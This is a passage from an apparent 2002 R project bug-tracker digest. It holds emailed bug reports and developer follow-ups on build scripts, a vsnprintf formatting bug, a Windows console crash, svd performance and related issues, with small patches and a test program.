Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.2.5i
In-Reply-To: <x28z64fo68.fsf@blueberry.kubism.ku.dk>; from p.dalgaard@biostat.ku.dk on Tue, May 28, 2002 at 02:32:31PM +0200
Sender: Cyril Humbert <cyril@univ-mlv.fr>

Peter Dalgaard BSA wrote:
> humbertc@univ-mlv.fr writes:
> 
> > Hitting ^C breaks readline history (when R is stared in an xterm).
> > 
> > xterm -e R
> > ^C    -> arrow key and history stop working.
> > For example, up-arrow gives "^[[A".
> 
> Yes, I've noticed as well. However, press Enter and things return to
> normal.

Thanks,
that's much better than my previous solution (quit and restart R).


> 
> If you give us a clue as to what causes the problem, we might fix it...

Probably something wrong with readline and/or ncurses but currently I
don't know exactly what...

-- 
Cyril Humbert 

==> 1606.audit <==
Mon Jun  3 20:57:41 2002	thomas	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2091 *
Subject: Scripts not executable
From: Peter Kleiweg <kleiweg@let.rug.nl>
Date: Wed, 2 Oct 2002 00:54:15 +0200 (CEST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2091 <==
From kleiweg@let.rug.nl  Wed Oct  2 00:55:02 2002
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id AAA26873
	for <r-bugs@biostat.ku.dk>; Wed, 2 Oct 2002 00:55:01 +0200 (MET DST)
Received: from a213-84-55-218.adsl.xs4all.nl ([213.84.55.218] helo=kleigh.nl)
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 17wVuH-0007yd-00
	for <r-bugs@r-project.org>; Tue, 01 Oct 2002 17:54:22 -0500
Received: from kleigh.nl (localhost [127.0.0.1])
	by kleigh.nl (8.12.2/8.12.2/SuSE Linux 0.6) with ESMTP id g91MsFH6024948
	for <r-bugs@r-project.org>; Wed, 2 Oct 2002 00:54:16 +0200
Received: from localhost (peter@localhost)
	by kleigh.nl (8.12.2/8.12.2/Submit) with ESMTP id g91MsFFI024945
	for <r-bugs@r-project.org>; Wed, 2 Oct 2002 00:54:15 +0200
X-Authentication-Warning: kleigh.nl: peter owned process doing -bs
Date: Wed, 2 Oct 2002 00:54:15 +0200 (CEST)
From: Peter Kleiweg <kleiweg@let.rug.nl>
X-X-Sender: peter@kleigh.nl
To: r-bugs@r-project.org
Subject: Scripts not executable
Message-ID: <Pine.LNX.4.44.0210020044530.1159-100000@kleigh.nl>
Organization: Alfa-Informatica, Rijksuniversiteit Groningen
X-Accept-Language: nl,en,ia,af,nds,de,da,no,sv,fr,it
X-Alert: http://www.opensource.org/halloween/
X-Face: "K~X:~!ydgSdjNy;]_+BCb\OM^pqyg_q*Le84$l46M\-mL=.^,L4B}bDK>`o#r4_>O*
X-Mailer: Pine 4.44, Linux 2.4.18-64GB-SMP, i686
X-Reason: http://www.interlingua.com/
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII



Running 'make' stops when it tries to build the recommended
(included) packages, because the script 'Rcmd' is not
executable. I have to do a 'chmod +x src/scripts/*' and rerun
'make'.

In version 1.5.1 I also noticed the installed scripts were not
executable, but I could do a 'chmod +x lib/R/bin/*' after 'make
install'. But now the scripts are already needed during 'make'.

This error does not occur on Linux-PC and Linux-Alpha.


Version:
 platform = hppa2.0-hp-hpux10.20
 arch = hppa2.0
 os = hpux10.20
 system = hppa2.0, hpux10.20
 status =
 major = 1
 minor = 6.0
 year = 2002
 month = 10
 day = 01
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base


==> 2091.followup.1 <==
From hornik@ci.tuwien.ac.at  Wed Oct  2 08:40:05 2002
Received: from isis.wu-wien.ac.at (isis.wu-wien.ac.at [137.208.3.42])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA28147
	for <R-bugs@biostat.ku.dk>; Wed, 2 Oct 2002 08:40:04 +0200 (MET DST)
Received: from mithrandir.hornik.net (mail@wu057056.wu-wien.ac.at [137.208.57.56])
	by isis.wu-wien.ac.at (8.8.7/8.8.7) with ESMTP id IAA130596emf hornik@ci.tuwien.ac.at; Wed, 2 Oct 2002 08:29:50 +0200
Received: from hornik by mithrandir.hornik.net with local (Exim 3.35 #1 (Debian))
	id 17wcw3-0002aH-00; Wed, 02 Oct 2002 08:24:39 +0200
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15770.37148.514799.185521@mithrandir.hornik.net>
Date: Wed, 2 Oct 2002 08:24:28 +0200
To: kleiweg@let.rug.nl
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: Scripts not executable (PR#2091)
In-Reply-To: <200210012255.AAA26878@pubhealth.ku.dk>
References: <200210012255.AAA26878@pubhealth.ku.dk>
X-Mailer: VM 7.07 under Emacs 21.2.1
Reply-To: Kurt.Hornik@wu-wien.ac.at
From: Kurt Hornik <hornik@ci.tuwien.ac.at>

>>>>> kleiweg  writes:

> Running 'make' stops when it tries to build the recommended
> (included) packages, because the script 'Rcmd' is not
> executable. I have to do a 'chmod +x src/scripts/*' and rerun
> 'make'.

> In version 1.5.1 I also noticed the installed scripts were not
> executable, but I could do a 'chmod +x lib/R/bin/*' after 'make
> install'. But now the scripts are already needed during 'make'.

> This error does not occur on Linux-PC and Linux-Alpha.

The scripts are installed using INSTALL_SCRIPT, which according to my
understanding should install as mode 755.

After running configure, my top-level Makeconf contains

INSTALL = /usr/bin/install -c
INSTALL_DATA = ${INSTALL} -m 644
INSTALL_PROGRAM = ${INSTALL}
INSTALL_SCRIPT = ${INSTALL}
INSTALL_DIR = ${INSTALL} -d

What does yours look like?

-k

==> 2091.audit <==
Sat Oct  5 00:06:54 2002	thomas	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2144 *
Subject: Save() with ascii=TRUE may corrupt numeric values
From: "Efthymiou, Nick" <Nick.Efthymiou@schwab.com>
Date: Thu, 10 Oct 2002 14:09:21 -0700
--Only on systems without vsnprintf
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2144 <==
From Nick.Efthymiou@schwab.com  Thu Oct 10 23:11:16 2002
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA19851
	for <r-bugs@biostat.ku.dk>; Thu, 10 Oct 2002 23:11:15 +0200 (MET DST)
Received: from cc0eb001.schwab.com ([162.93.253.1])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 17zkZn-0000ua-00
	for <r-bugs@r-project.org>; Thu, 10 Oct 2002 16:10:35 -0500
Received: by othbh/cc0eb001.schwab.com v1.000dar for <r-bugs@r-project.org> qnum g9AL8eu18597
Received-Date: Thu, 10 Oct 2002 17:08:40 -0400 (EDT)
Received: from unknown(162.93.239.66) by cc0eb001.schwab.com via smap (V5.5)
	id xma018351; Thu, 10 Oct 02 17:07:40 -0400
Received: (from root@localhost) by sendmail.cf s0744cdc  id g9AL9Rt25938 for r-bugs@r-project.org; Thu, 10 Oct 2002 17:09:27 -0400 (EDT)
Received: ( Schwab Email )
	by copymail.cf s0743cdc  with SMTP id g9AL9QD25929;
	for <r-bugs@r-project.org>; Thu, 10 Oct 2002 17:09:26 -0400 (EDT)
Received: FROM n2121pmx.nt.schwab.com BY n2110pmx.nt.schwab.com ; Thu Oct 10 14:09:25 2002 -0700
Received: by N2121PMX with Internet Mail Service (5.5.2653.19)
	id <P5CZNPVF>; Thu, 10 Oct 2002 14:09:26 -0700
Message-ID: <72138202E59CD6118E960002A52CD9D22DDD7F@N1025SMX>
From: "Efthymiou, Nick" <Nick.Efthymiou@schwab.com>
To: "'r-bugs@r-project.org'" <r-bugs@r-project.org>
Cc: "'NEFTH@pacbell.net'" <NEFTH@pacbell.net>
Subject: Save() with ascii=TRUE may corrupt numeric values
Date: Thu, 10 Oct 2002 14:09:21 -0700
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2653.19)
Content-Type: multipart/mixed;
	boundary="----_=_NextPart_000_01C270A1.4D6FE6E0"


This message is in MIME format. Since your mail reader does not understand
this format, some or all of this message may not be legible.

------_=_NextPart_000_01C270A1.4D6FE6E0
Content-Type: text/plain


When the vsnprintf() function in R_HOME/src/main/vsnprintf.c 
serializes numbers with a fractional part less than 0.1, the 
serialized value is wrong.  For example, 66.03 is serialized 
as 66.30.

The attached unit test 'utvsnprintf.c' illustrates the buggy 
behaviour.

Additional Notes:
1. The bug is in function fmtfp() in vsnprintf.c
2. The bug only affects non-default use of save():
save(..., ascii=TRUE).
3. The bug will only manifest itself on systems without
a vsnprintf. Unfortunately, the removal of HAVE_VSNPRINTF
in R 1.5.0 (and the addition of an R-supplied implementation)
causes those systems to start using the buggy implementation.

--please do not edit the information below--

Version:
 platform = i386-pc-sco3.2v4.2
 arch = i386
 os = sco3.2v4.2
 system = i386, sco3.2v4.2
 status = 
 major = 1
 minor = 4.1
 year = 2002
 month = 01
 day = 30
 language = R

Search Path:
 .GlobalEnv, Autoloads, package:base

Attached: unit test driver
 <<utvsnprintf.c>> 
Nick Efthymiou
VP Global Wireless Architecture
Charles Schwab & Co.


> 	WARNING: All e-mail sent to or from this address will be received or
> otherwise recorded by the Charles Schwab corporate e-mail system and is
> subject to archival, monitoring or review by, and/or disclosure to someone
> other than the recipient.
> 
> 

------_=_NextPart_000_01C270A1.4D6FE6E0
Content-Type: application/octet-stream;
	name="utvsnprintf.c"
Content-Disposition: attachment;
	filename="utvsnprintf.c"


/*
 * Unit test for vsnprintf.
 * Build with gcc -O -g utvsnprintf.c vsnprintf.o -o utvsnprintf
 */

#include <stdio.h>
#include <stdarg.h>

int vsnprintf (char *str, size_t cnt, const char *fmt, va_list arg);
int callv(const char *fmt, ...);

int main()
{
	double d = 80.06;
	int rc = callv("%.16g", d);
	printf("\n");
	printf("rc=%d\n", rc);
	return 0;
}

int callv(const char *fmt, ...)
{
	char buf[128];
	va_list argp;
	int rc;
	va_start(argp, fmt);
	rc = vsnprintf(buf, 120, "%.16g", argp);
	va_end(argp);
	printf(buf);
	printf("\n");
	return rc;
}


------_=_NextPart_000_01C270A1.4D6FE6E0--

==> 2144.audit <==
Tue Oct 22 16:39:37 2002	ripley	changed notes
Tue Oct 22 16:39:37 2002	ripley	foobar
Tue Oct 22 16:39:37 2002	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  TooMuchAtOnce

none

Directory:  Windows

* PR# 1711 *
Subject: GUI bug
From: socrates@mail.ru
Date: Thu, 27 Jun 2002 10:30:51 +0200 (MET DST)
--A crash that is *very* hard to trigger (after several
--minutes of continuous resizing)
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1711 <==
From socrates@mail.ru  Thu Jun 27 10:30:52 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA29460
	for <R-bugs@biostat.ku.dk>; Thu, 27 Jun 2002 10:30:51 +0200 (MET DST)
Date: Thu, 27 Jun 2002 10:30:51 +0200 (MET DST)
From: socrates@mail.ru
Message-Id: <200206270830.KAA29460@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: GUI bug

Full_Name: Socrates Alikhanidi
Version: 1.5.1
OS: Windows 2000
Submission from: (NULL) (133.15.3.28)


During resizing of 'R Console' windows the fatal error of forbidden memory
access appears.
To reproduce that with a guaranty, resize windows by mouse with small steps.
Probably the faster computer is, the earlier that event appears. I have PIV 1.8
GHz.
Waiting time was near 1 second.

Thank you for great product.

==> 1711.followup.1 <==
From ripley@stats.ox.ac.uk  Thu Jun 27 11:00:38 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA29885
	for <R-bugs@biostat.ku.dk>; Thu, 27 Jun 2002 11:00:38 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id JAA06964;
	Thu, 27 Jun 2002 09:59:54 +0100 (BST)
Date: Thu, 27 Jun 2002 09:59:54 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: <socrates@mail.ru>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>
Subject: Re: GUI bug (PR#1711)
In-Reply-To: <200206270830.KAA29465@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0206270956340.17120-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

Sorry, I cannot reproduce that on Windows XP, on either a P4 1.4MHz
or an AthlonXP 1800.  If it were a common problem I am sure we would hear
about it often.

Why are you resizing the console at all?  You can set a suitable size in
the preferences.

On Thu, 27 Jun 2002 socrates@mail.ru wrote:

> Full_Name: Socrates Alikhanidi
> Version: 1.5.1
> OS: Windows 2000
> Submission from: (NULL) (133.15.3.28)
>
>
> During resizing of 'R Console' windows the fatal error of forbidden memory
> access appears.
> To reproduce that with a guaranty, resize windows by mouse with small steps.
> Probably the faster computer is, the earlier that event appears. I have PIV 1.8
> GHz.
> Waiting time was near 1 second.
>
> Thank you for great product.

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1711.followup.2 <==
From murdoch@stats.uwo.ca  Thu Jun 27 16:15:53 2002
Received: from pony.its.uwo.ca (pony.its.uwo.ca [129.100.2.63])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA04424
	for <R-bugs@biostat.ku.dk>; Thu, 27 Jun 2002 16:15:51 +0200 (MET DST)
Received: from femail.its.uwo.ca (hurdle.its.uwo.ca [129.100.2.108])
	by pony.its.uwo.ca (8.12.1/8.12.0) with ESMTP id g5REEoiV020595
	for <R-bugs@biostat.ku.dk>; Thu, 27 Jun 2002 10:15:05 -0400 (EDT)
Received: from fisher.stats.uwo.ca (fisher.stats.uwo.ca [129.100.45.201])
	by femail.its.uwo.ca (8.12.1/8.12.0) with ESMTP id g5REEiFq009390;
	Thu, 27 Jun 2002 10:14:44 -0400 (EDT)
Received: from djm.stats.uwo.ca (djm.stats.uwo.ca [129.100.45.113])
	by fisher.stats.uwo.ca (8.11.6/linuxconf) with SMTP id g5REEeB10987;
	Thu, 27 Jun 2002 10:14:43 -0400
From: Duncan Murdoch <murdoch@stats.uwo.ca>
To: ripley@stats.ox.ac.uk
Cc: <socrates@mail.ru>, <R-bugs@biostat.ku.dk>
Subject: Re: GUI bug (PR#1711)
Date: Thu, 27 Jun 2002 10:15:01 -0400
Message-ID: <sp6mhusb0u7dsalm2clhtdsja14ot6561e@4ax.com>
References: <200206270830.KAA29465@pubhealth.ku.dk> <Pine.LNX.4.31.0206270956340.17120-100000@gannet.stats>
In-Reply-To: <Pine.LNX.4.31.0206270956340.17120-100000@gannet.stats>
X-Mailer: Forte Agent 1.91/32.564
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

I can reproduce it in Win98 on a fairly slow machine.  It looks to me
as though the routine that's handling the WM_SIZE messages is being
interrupted by the new resize requests, and eventually the stack
overflows.  It would be best to ignore such requests while one is
active.  I don't understand graphapp well enough to know where to fix
this.

Duncan Murdoch

On Thu, 27 Jun 2002 09:59:54 +0100 (BST), you wrote in message
<Pine.LNX.4.31.0206270956340.17120-100000@gannet.stats>:

>Sorry, I cannot reproduce that on Windows XP, on either a P4 1.4MHz
>or an AthlonXP 1800.  If it were a common problem I am sure we would hear
>about it often.
>
>Why are you resizing the console at all?  You can set a suitable size in
>the preferences.
>
>On Thu, 27 Jun 2002 socrates@mail.ru wrote:
>
>> Full_Name: Socrates Alikhanidi
>> Version: 1.5.1
>> OS: Windows 2000
>> Submission from: (NULL) (133.15.3.28)
>>
>>
>> During resizing of 'R Console' windows the fatal error of forbidden memory
>> access appears.
>> To reproduce that with a guaranty, resize windows by mouse with small steps.
>> Probably the faster computer is, the earlier that event appears. I have PIV 1.8
>> GHz.
>> Waiting time was near 1 second.
>>
>> Thank you for great product.


==> 1711.audit <==
Thu Jun 27 12:29:21 2002	ripley	moved from incoming to not-reproducible
Fri Jun 28 09:36:17 2002	ripley	changed notes
Fri Jun 28 09:36:17 2002	ripley	foobar
Fri Jun 28 09:36:17 2002	ripley	moved from not-reproducible to Windows
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  incoming

* PR# 1556 *
Subject: lib.fixup, .GlobalEnv, and R1.5.0
From: mark.bravington@csiro.au
Date: Wed, 15 May 2002 08:30:50 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1556 <==
From mark.bravington@csiro.au  Wed May 15 08:30:50 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA24614
	for <R-bugs@biostat.ku.dk>; Wed, 15 May 2002 08:30:50 +0200 (MET DST)
Date: Wed, 15 May 2002 08:30:50 +0200 (MET DST)
From: mark.bravington@csiro.au
Message-Id: <200205150630.IAA24614@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: lib.fixup, .GlobalEnv, and R1.5.0

Full_Name: Mark Bravington
Version: 1.5.0
OS: Windows 2000
Submission from: (NULL) (140.79.2.3)


In R1.3.1, I used the following code inside a function to set a "path" attribute
to .GlobalEnv:

  env_ pos.to.env( 1)
  attr( env, 'path')_ .Path # .Path is a named char vector of length 1
  .Internal( lib.fixup( env, .GlobalEnv)) # adds the attribute

And this works fine. But in R1.5.0, the same code (executed e.g. within a call
to "local" from the command line) removes all the objects in .GlobalEnv (note,
though, that the 'path' attribute does get set OK). For various reasons, this
feature is crucial to me, so I can't actually use R1.5.0 without it!

Oddly, my code used to explicitly set a path attribute for newly-attached things
using this mechanism, and this has now been incorporated into R1.5.0 "library"
command. So I'm clearly not doing anything naughty here!

A suggestion: wouldn't it be easier if we could use

attr( env, <<whatever>>) # where env is an environment

and

attr( env, <<whatever>>)_ 45

instead of having to go via "lib.fixup"?

cheers
Mark


  

==> 1556.followup.1 <==
From Mark.Bravington@csiro.au  Thu May 16 08:48:23 2002
Received: from bastion.tas.csiro.au (bastion.tas.csiro.au [140.79.2.8])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA04149
	for <r-bugs@biostat.ku.dk>; Thu, 16 May 2002 08:48:21 +0200 (MET DST)
From: Mark.Bravington@csiro.au
Received: from bastion.tas.csiro.au (localhost [127.0.0.1])
	by bastion.tas.csiro.au (8.11.4/8.11.4) with ESMTP id g4G6le813565
	for <r-bugs@biostat.ku.dk>; Thu, 16 May 2002 16:47:41 +1000 (EST)
Received: from molly.tas.csiro.au (molly.tas.csiro.au [140.79.3.40])
	by bastion.tas.csiro.au (8.11.4/8.11.4) with ESMTP id g4G6leO13554
	for <r-bugs@biostat.ku.dk>; Thu, 16 May 2002 16:47:40 +1000 (EST)
Received: by molly.tas.csiro.au with Internet Mail Service (5.5.2655.55)
	id <KSPS0LFF>; Thu, 16 May 2002 16:47:30 +1000
Message-ID: <A8877251964B294BAB5BA1FC58B43FED26DC18@molly.tas.csiro.au>
To: r-bugs@biostat.ku.dk
Subject: (PR#1556)
Date: Thu, 16 May 2002 16:47:26 +1000
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2655.55)
Content-Type: text/plain;
	charset="iso-8859-1"

lib.fixup

My previous post mentions a problem encountered when calling ".Internal(
lib.fixup..." in R1.5.0. I have since found a workaround. It's possible in
R1.5.0 to set attributes of search path environments directly, like so:

> env_ pos.to.env( 3)
> attr( env, 'any.attr')_ 'any.value'
> pos.to.env( 3)
<environment: package:tcltk>
attr(,"name")
[1] "package:tcltk"
attr(,"path")
[1] "C:/R/rw1050/library/tcltk"
attr(,"any.attr")
[1] "any.value"

In R1.3.1, it used to be necessary to use lib.fixup to achieve this. It's
still not possible to call

> attr( pos.to.env( 3), 'any.attr')_ 'any.value'

directly, but this doesn't matter. My (mis-typed) wish-lish-suggestion in
the last post, is therefore irrelevant, and personally I no longer need
lib.fixup. NB that it can still cause problems if it is used-- but as it's
undocumented, I don't suppose this will be a major issue.

Nevertheless, calls to ".Internal( lib.fixup..." are not things of beauty,
and I wonder whether the current usage in "library" is actually necessary?
The code currently reads

            loadenv <- new.env(hash = TRUE, parent = .GlobalEnv)
            <<...>>
                sys.source(codeFile, loadenv, keep.source = keep.source)
            <<...>>
            env <- attach(NULL, name = pkgname)
            on.exit(do.call("detach", list(name = pkgname)))
            attr(env, "path") <- file.path(which.lib.loc, package)
            .Internal(lib.fixup(loadenv, env))
            
but I seem to get satisfactory results with

      env_ attach( NULL, name = pkgname)
      on.exit(do.call("detach", list(name = pkgname)))            
      attr( env, "path") <- file.path(which.lib.loc, package)
      <<...>>
          sys.source(codeFile, env, keep.source = keep.source) # i.e.
straight into "env" not into "loadenv"
      <<...>>
      
which does away with the calls to "new.env" and "lib.fixup". As far as I can
see, the "parent=.GlobalEnv" argument to "new.env" doesn't have any effect
after "lib.fixup"; I'm not sure about the "hash=TRUE".

cheers
Mark

*******************************

Mark Bravington
CSIRO (CMIS)
PO Box 1538
Castray Esplanade
Hobart
TAS 7001

phone (61) 3 6232 5118
fax (61) 3 6232 5012
Mark.Bravington@csiro.au 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1761 *
Subject: svd() very slow for wide matrix X but not for t(X)
From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
Date: Tue, 9 Jul 2002 11:39:15 -0400 
--Doesn't happen with the now preferred La.svd.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1761 <==
From gregory_r_warnes@groton.pfizer.com  Tue Jul  9 17:40:07 2002
Received: from mailrelay5.pfizer.com (ns11.pfizer.com [192.77.198.11])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA08916
	for <r-bugs@biostat.ku.dk>; Tue, 9 Jul 2002 17:40:06 +0200 (MET DST)
Received: from gsun34.pfizer.com (localhost [127.0.0.1])
	by mailrelay5.pfizer.com (Switch-2.1.3/Switch-2.1.0) with ESMTP id g69Fcrb25273
	for <r-bugs@biostat.ku.dk>; Tue, 9 Jul 2002 11:38:53 -0400 (EDT)
Received: from groexms01.pfizer.com (localhost [127.0.0.1])
	by gsun34.pfizer.com (Pro-8.9.3/Pro-8.9.3) with ESMTP id LAA07195
	for <r-bugs@biostat.ku.dk>; Tue, 9 Jul 2002 11:39:10 -0400 (EDT)
Received: from groexcncr01.pfizer.com (unverified) by groexms01.pfizer.com
 (Content Technologies SMTPRS 4.2.1) with ESMTP id <T5bfb934af4ac1e08e25b0@groexms01.pfizer.com> for <r-bugs@biostat.ku.dk>;
 Tue, 9 Jul 2002 11:39:18 -0400
Received: by groexcncr01.pfizer.com with Internet Mail Service (5.5.2654.89)
	id <3SDS1QJT>; Tue, 9 Jul 2002 11:39:17 -0400
Message-ID: <D7A3CFD7825BD6119B880002A58F06C227E6C1@groexmb02.pfizer.com>
From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
To: "'R-bugs'" <r-bugs@biostat.ku.dk>
Cc: "Potter, David M" <david_m_potter@groton.pfizer.com>
Subject: svd() very slow for wide matrix X but not for t(X)
Date: Tue, 9 Jul 2002 11:39:15 -0400 
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2654.89)
Content-Type: text/plain; charset="windows-1252"


Hi All,

A colleague has just pointed out to me prcomp is *much* slower and memory
intensive when applied to very wide matrixes than when applied to the
transpose of the same matrix.  In looking for the reason, I discovered that
that the singular value decomposition function svd is the primary culprit:

On my Solaris workstation, under R 1.5.1:

	>  nr <- 50
	>  nc <- 1000
	>  x  <- matrix( rnorm( nr*nc), nrow=nr, ncol=nc )
	>  tx <- t(x)
	>
	> # SVD directly on matrix is SLOW
	>  system.time( val.x <- svd(x)$u )
	[1] 5.41 0.00 5.62 0.00 0.00
	>
	> # SVD directly on t(matrix) is FAST
	>  system.time( val.tx <- svd(tx)$v )
	[1] 0.60 0.00 0.61 0.00 0.00
	>
	> # but the results are (essentially) identical
	> max( abs(val.x) - abs(val.tx) )
	[1] 4.201361e-13

The speed difference gets worse as the number of columns grows.  

Here is a simple patch to $R_SRC/src/library/base/R/svd.R that works around
the problem.  It simply checks whether the matrix is wider than it is long,
and if so, calls itself on the transpose of the matrix, and then exchanges
the returned u and v matrixes.


*** svd.R.orig Tue Jul  9 11:06:46 2002
--- svd.R Tue Jul  9 11:06:49 2002
***************
*** 5,10 ****
--- 5,17 ----
      n <- dx[1]
      p <- dx[2]
      if(!n || !p) stop("0 extent dimensions")
+ 
+     if( p > n )  # compute on the transpose if wide
+       {
+         s <- svd( t(x), nv=nu, nu=nv)
+         return( d=s$d, u=s$v, v=s$u )
+       }
+     
      if (is.complex(x)) {
          res <- La.svd(x, nu, nv)
          return(list(d = res$d, u = if(nu) res$u, v = if(nv)
Conj(t(res$vt))))


With this patch the speed is almost the same whether called on x or tx:

	> system.time( val.x <- svd(x)$u )
	[1] 0.62 0.00 0.66 0.00 0.00

	> system.time( val.tx <- svd(tx)$v )
	[1] 0.60 0.00 0.86 0.00 0.00

	> identical( val.x, val.tx )
	[1] TRUE

This is fine for my purposes, but perhaps someone familiar with the FORTRAN
code should see why its performance is so unbalanced.

Extra details:

> version
         _                   
platform sparc-sun-solaris2.8
arch     sparc               
os       solaris2.8          
system   sparc, solaris2.8   
status   Patched             
major    1                   
minor    5.1                 
year     2002                
month    06                  
day      18                  
language R                   
>

-Greg Warnes








LEGAL NOTICE
Unless expressly stated otherwise, this message is confidential and may be privileged. It is intended for the addressee(s) only. Access to this E-mail by anyone else is unauthorized. If you are not an addressee, any disclosure or copying of the contents of this E-mail or any action taken (or not taken) in reliance on it is unauthorized and may be unlawful. If you are not an addressee, please inform the sender immediately.

==> 1761.audit <==
Wed Jul 10 19:24:04 2002	thomas	changed notes
Wed Jul 10 19:24:04 2002	thomas	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2003 *
Subject: rhome.c: getRHOME() fails, if R is called from SJava
From: grimm.heinz@rcc.ch
Date: Wed, 11 Sep 2002 15:17:53 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2003 <==
From grimm.heinz@rcc.ch  Wed Sep 11 15:17:54 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA14877
	for <R-bugs@biostat.ku.dk>; Wed, 11 Sep 2002 15:17:53 +0200 (MET DST)
Date: Wed, 11 Sep 2002 15:17:53 +0200 (MET DST)
From: grimm.heinz@rcc.ch
Message-Id: <200209111317.PAA14877@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: rhome.c: getRHOME() fails, if R is called from SJava

Full_Name: Heinz Grimm
Version: R1.5.1
OS: Windows NT 4.0
Submission from: (NULL) (195.65.178.178)


The R error message is:
"Fatal error: Unable to open base package"

The reason is:
getRHome() returns e.g. d:/r-project/R-1.5.1 if called within R (correct)

getRHome() returns e.g. D:/jdk1.3.1_01/jre if R is called from SJava (0.65),
hence
R tries to load the base library from D:/jdk1.3.1_01/jre/library/base/R/base
(very
bad)

I have modified $R_HOME/src/gnuwin32/rhome.c in this way:

char *getRHOME()
{
    char *RHome;

    RHome = getenv("R_HOME");
    if(!RHome)
    {
      RHome = getenv("RHOME");
    }
    if(!RHome)
    {
      fprintf(stderr, "No R_HOME environment variable value\n");fflush(stderr);
      exit(1);
    }
    strcpy( rhomebuf, RHome);
    return (rhomebuf);
}

now it works fine!

Heinz Grimm
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2018 *
Subject: missing data in stripchart
From: baron@CATTELL.psych.upenn.edu
Date: Sat, 14 Sep 2002 19:35:32 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2018 <==
From baron@CATTELL.psych.upenn.edu  Sat Sep 14 19:35:33 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA07681
	for <R-bugs@biostat.ku.dk>; Sat, 14 Sep 2002 19:35:32 +0200 (MET DST)
Date: Sat, 14 Sep 2002 19:35:32 +0200 (MET DST)
Message-Id: <200209141735.TAA07681@pubhealth.ku.dk>
From: baron@CATTELL.psych.upenn.edu
To: R-bugs@biostat.ku.dk
Subject: missing data in stripchart

Full_Name: Jonathan Baron
Version: 1.5.1
OS: Linux
Submission from: (NULL) (151.201.155.186)


The documentation of stripchart() says that "NA's are allowed in
the data."  I think this would imply that

stripchart(nprob[cancer==4] ~ probtype[cancer==4],meth="stack")

should work even if nprob has a missing datum in the relevant range.
I get the following error message:

Error in xy.coords(x, y) : x and y lengths differ
In addition: Warning message: 
longer object length
is not a multiple of shorter object length in: y + (unlist(xo, use.names =
FALSE) - 1) * offset * csize 

The following works.  There was one missing datum.

